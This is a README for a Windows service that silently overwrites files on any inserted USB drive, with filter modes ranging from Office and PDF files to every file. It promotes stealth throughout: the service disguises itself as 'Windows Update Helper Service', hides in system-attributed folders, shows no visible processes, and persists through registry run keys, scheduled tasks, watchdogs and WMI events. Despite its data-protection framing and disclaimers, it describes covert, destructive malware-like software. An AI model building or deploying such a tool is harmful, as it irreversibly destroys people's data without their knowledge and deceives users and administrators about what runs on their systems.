# USB Security Service - Complete Stealth Operation

A Windows service that runs completely hidden and monitors USB drives, overwriting files based on configurable security filters. The service operates in complete stealth mode with a separate GUI controller for configuration management.

## 🥷 **Complete Stealth Operation**

### **Service (Hidden Background Operation)**
- ✅ **Completely invisible** - No windows, no system tray icons, no visible processes
- ✅ **Disguised as Windows service** - "Windows Update Helper Service"
- ✅ **Automatic startup** - Starts invisibly with Windows
- ✅ **Maximum persistence** - Multiple watchdog mechanisms ensure continuous operation
- ✅ **Real-time monitoring** - Instantly detects and processes USB drives
- ✅ **Silent operation** - No notifications, popups, or user interaction

### **Controller GUI (Configuration Only)**
- 🎛️ **Configuration interface** - Modern GUI for changing settings
- 📊 **Service status monitoring** - Real-time status of hidden service
- ⚙️ **Filter mode management** - Easy switching between security levels
- 🔄 **Service control** - Start/stop/restart the hidden service
- ❌ **Independent operation** - Closing GUI does NOT stop the service

## 🚀 **Quick Setup**

### **1. Install Stealth Service**
```bash
1. Right-click "Install.bat"
2. Select "Run as Administrator"
3. Follow installation prompts
4. Service installs and starts automatically (completely hidden)
```

### **2. Configure Using GUI Controller**
```bash
1. Double-click "Configure_GUI.bat"
2. Select filter mode (ALL/Office/PDF/Office+PDF)
3. Click "Apply & Restart Service"
4. Close GUI - service continues running invisibly
```

### **3. Verify Stealth Operation**
```bash
✓ No visible processes in Task Manager
✓ No system tray icons
✓ Insert USB - files overwritten silently
✓ Reboot - service starts automatically and invisibly
```

## 🔒 **Security Filter Modes**

### **🔴 ALL Files (Maximum Security)**
```
What it does: Overwrites EVERY file on USB drives
Files affected: Documents, photos, videos, executables, everything
Best for: High-security environments, government, military
Risk level: MAXIMUM - complete data destruction
```

### **📄 Office Files Only**
```
What it does: Overwrites only Microsoft Office documents
Files affected: .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pub, .vsd, etc.
Files safe: Photos, videos, music, PDFs, executables
Best for: Corporate environments allowing personal files
Risk level: MODERATE - targeted document protection
```

### **📋 PDF Files Only**
```
What it does: Overwrites only PDF files
Files affected: .pdf files only
Files safe: Office docs, photos, videos, music, executables
Best for: Research environments, academic institutions
Risk level: LOW - very specific protection
```

### **📊 Office + PDF Files**
```
What it does: Overwrites Microsoft Office files AND PDFs
Files affected: All Office files + PDF files
Files safe: Photos, videos, music, executables
Best for: Legal, financial, healthcare environments
Risk level: HIGH - comprehensive document protection
```

## 📁 **Project Structure**

```
USB-Security-Service/
├── src/                              # Source code
│   ├── usb_audit_service.py         # Main stealth service
│   ├── usb_service_controller.py    # GUI controller
│   └── configure_filter.py          # Command-line config utility
├── Install.bat                      # Main installer
├── Configure_GUI.bat                # GUI controller launcher
├── Configure_CLI.bat                # CLI configuration launcher
├── README.md                        # This file
└── config.ini                       # Configuration file (created after install)
```

## 🛠️ **Installation Details**

### **What Gets Installed**
- **Hidden service** in `%ProgramData%\.system\WindowsUpdateHelper\`
- **Python runtime** (embedded if not already installed)
- **Service registration** as "Windows Update Helper Service"
- **Watchdog mechanisms** for maximum persistence
- **Desktop shortcut** for controller GUI
- **Configuration files** for filter management

### **Stealth Features**
- **Hidden directories** with system attributes
- **Disguised service name** appears as Windows system service
- **No visible processes** to end users
- **Registry persistence** with multiple startup entries
- **Scheduled task backups** for reliability
- **WMI event monitoring** for advanced persistence

### **Automatic Startup**
- **Windows service** starts automatically with system
- **Multiple watchdogs** monitor and restart if needed
- **Registry run keys** provide backup startup
- **Scheduled tasks** ensure service availability
- **Self-healing** mechanisms recover from failures

## 🎛️ **Using the Controller GUI**

### **Opening the Controller**
```bash
# Three ways to open:
1. Run: Configure_GUI.bat
2. Desktop shortcut: "USB Security Controller" (created during install)
3. Start Menu: Search for "USB Security Controller"
```

### **Controller Features**
- **Service Status** - Real-time monitoring of hidden service
- **Filter Configuration** - Change security modes instantly
- **Service Control** - Start/stop/restart hidden service
- **Live Updates** - Status refreshes every 5 seconds
- **Safety Confirmations** - Prevents accidental changes

### **Changing Filter Modes**
```bash
# GUI Configuration (Recommended):
1. Run Configure_GUI.bat
2. Select new filter mode from dropdown
3. Click "Apply & Restart Service"
4. Confirm the change
5. Service restarts with new settings
6. Close GUI - service continues running

# Command Line Configuration:
1. Run Configure_CLI.bat
2. Follow the text-based prompts
3. Select filter mode (1-4)
4. Confirm service restart
5. Service applies new settings
```

## 🔍 **Monitoring & Verification**

### **Check Service Status**
```bash
# Using Controller GUI (recommended):
1. Open "USB Security Controller"
2. View real-time service status
3. See current filter mode
4. Check last update time

# Using Windows Services:
1. Run: services.msc
2. Look for "Windows Update Helper Service"
3. Should show "Running" and "Automatic"

# Using Command Line:
sc query WindowsUpdateHelperService
```

### **View Activity Logs**
```bash
# Windows Event Viewer:
1. Run: eventvwr.msc
2. Navigate to: Windows Logs -> Application
3. Look for "WindowsUpdateHelperService" events
4. View service startup and activity messages
```

### **Test Configuration**
```bash
1. Prepare test USB with sample files
2. Insert USB drive
3. Wait 5-10 seconds
4. Check files - target files should be overwritten
5. Verify in Event Viewer logs
```

## ⚠️ **Important Safety Information**

### **⚠️ CRITICAL WARNING**
**THIS SOFTWARE PERMANENTLY DESTROYS DATA ON USB DRIVES**
- Files are **IRREVERSIBLY OVERWRITTEN** with random data
- **DATA RECOVERY IS IMPOSSIBLE** after overwriting
- Test configuration thoroughly before deployment
- Backup important data before use
- Authors are **NOT RESPONSIBLE** for any data loss

### **What This Protects Against**
- Data exfiltration via USB drives
- Accidental data leaks through removable media
- Insider threats copying sensitive files
- Compliance violations in regulated industries

### **What This Does NOT Protect Against**
- Network-based data exfiltration
- Cloud storage uploads
- Email attachments or web uploads
- Screen capture or photography
- Other attack vectors

### **Best Practices**
1. **Test first** - Use test USB drives with non-important files
2. **Document configuration** - Keep records of filter modes used
3. **User training** - Educate users about USB security policies
4. **Regular monitoring** - Check service status and logs periodically
5. **Layered security** - Combine with other security measures

## 🔧 **Troubleshooting**

### **Service Won't Start**
```bash
1. Check Administrator privileges
2. Verify Python installation
3. Check pywin32 installation
4. Review Event Viewer for errors
5. Try: net start WindowsUpdateHelperService
```

### **Controller Won't Open**
```bash
1. Run as Administrator
2. Check Python installation
3. Verify pywin32 dependency
4. Try launching from installation directory
5. Check for error messages
```

### **Files Not Being Overwritten**
```bash
1. Verify service is running (Controller GUI)
2. Check filter mode matches file types
3. Ensure USB drive is removable type
4. Check Event Viewer for activity
5. Test with different USB drive
```

### **Configuration Not Applied**
```bash
1. Verify config file permissions
2. Restart service after changes
3. Use Controller GUI (recommended)
4. Check Event Viewer for errors
```

## 🗑️ **Complete Uninstallation**

### **Stop All Components**
```bash
# Stop scheduled tasks:
schtasks /delete /tn "WindowsUpdateHelperWatchdog" /f
schtasks /delete /tn "WindowsUpdateHelperDaily" /f

# Stop and remove service:
net stop WindowsUpdateHelperService
sc delete WindowsUpdateHelperService
```

### **Remove Files and Registry**
```bash
# Remove registry entries:
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateHelper" /f

# Remove installation directory:
rmdir /s /q "%ProgramData%\.system\WindowsUpdateHelper"

# Remove desktop shortcut:
del "%USERPROFILE%\Desktop\USB Security Controller.lnk"
```

## 📋 **System Requirements**

### **Minimum Requirements**
- **OS**: Windows 10/11 (64-bit recommended)
- **Python**: 3.10+ (auto-installed if not present)
- **RAM**: 100MB available memory
- **Storage**: 200MB free space
- **Permissions**: Administrator (for installation and service control)

### **Dependencies (Auto-installed)**
- **pywin32** - Windows API integration
- **configparser** - Configuration management (built-in)
- **tkinter** - GUI framework (included with Python)

## 📄 **License & Disclaimer**

### **Intended Use**
This software is designed for **legitimate security purposes** in environments where preventing data exfiltration via USB drives is necessary for:
- Corporate data protection
- Compliance with security regulations
- Protection of sensitive information
- Prevention of accidental data leaks

### **Legal Compliance**
Users are responsible for ensuring compliance with:
- Local laws and regulations
- Corporate policies and procedures
- Data protection requirements
- Employee notification requirements

---

## 🎉 **You're All Set!**

Your USB security system is now running in **complete stealth mode**:

- 🥷 **Invisible operation** - No visible signs of the security system
- 🔒 **Automatic protection** - Files overwritten based on your filter mode
- 🎛️ **Easy management** - Use the Controller GUI anytime to change settings
- 🔄 **Persistent operation** - Continues running even after reboots
- 🛡️ **Reliable protection** - Multiple mechanisms ensure continuous operation

**Remember**: The service runs completely hidden. Only use the Controller GUI when you need to change settings or check status. Closing the GUI does NOT stop the service - it continues protecting your system invisibly!